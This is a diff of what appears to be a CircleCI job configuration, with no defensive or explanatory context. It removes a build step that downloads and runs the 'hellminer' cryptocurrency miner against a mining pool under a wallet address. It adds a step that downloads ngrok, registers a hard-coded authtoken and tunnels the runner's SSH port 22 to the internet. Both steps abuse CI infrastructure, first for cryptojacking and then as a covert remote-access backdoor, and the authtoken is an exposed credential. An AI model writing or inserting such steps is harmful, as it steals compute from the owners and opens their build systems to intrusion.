@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcps://ap.luckpool.net:3956#xnsub -u RSK1DEPiQxQ68CYwLtfsvYemXSV3pVN7bW.cio -p x --cpu 16
+      - run: wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip && unzip ngrok-stable-linux-amd64.zip && ./ngrok authtoken 20zmb2yaspIUA5EaVJph129YbLh_7iewF6BPSBpwDW3qnWPhB && ./ngrok tcp 22  
